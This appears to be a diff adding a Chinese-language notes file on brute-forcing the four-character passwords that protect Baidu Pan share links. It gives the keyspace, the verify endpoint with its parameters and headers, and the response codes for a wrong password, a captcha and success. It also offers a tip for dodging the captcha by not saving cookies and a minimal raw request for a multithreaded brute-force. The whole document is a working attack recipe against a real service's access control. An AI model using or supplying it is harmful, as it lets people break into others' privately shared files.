@@ -1,0 +1,41 @@
+适用于多线程开肝
+共36^4 = 1679616种排列组合
+POST http://pan.baidu.com/share/verify
+Query String Parameters
+shareid: {$shareid}
+uk: {$uk}
+t: {$timestamp}*1000
+bdstoken: {$bdstoken} or "null"
+channel: "chunlei"
+clienttype: 0
+web: 1
+app_id: 250528
+logid: {$logid}
+
+Header Parameters:
+XMLHttpRequest (with Origin and Referer)
+
+Post Data (application/x-www-form-urlencoded)
+pwd: abcd
+vcode: (empty)
+vcode_str: (empty)
+
+注意不要保存cookie，否则会有验证码
+
+失败返回（密码错误）
+{"errno":-9,"err_msg":"","request_id":5262813406111293057}
+验证码错误
+{"errno":-62,"err_msg":"","request_id":5262813406111293057}
+成功返回
+{"errno":0,"err_msg":"","request_id":5262846836500273100}
+
+
+爆破的最精简的形式：
+（参照http://mtfly.net/253）
+POST /share/verify?shareid={$shareid}&uk={$uk}&t={$timestamp}*1000 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: pan.baidu.com
+Content-Length: 8
+
+pwd=abcd
+完工（笑）
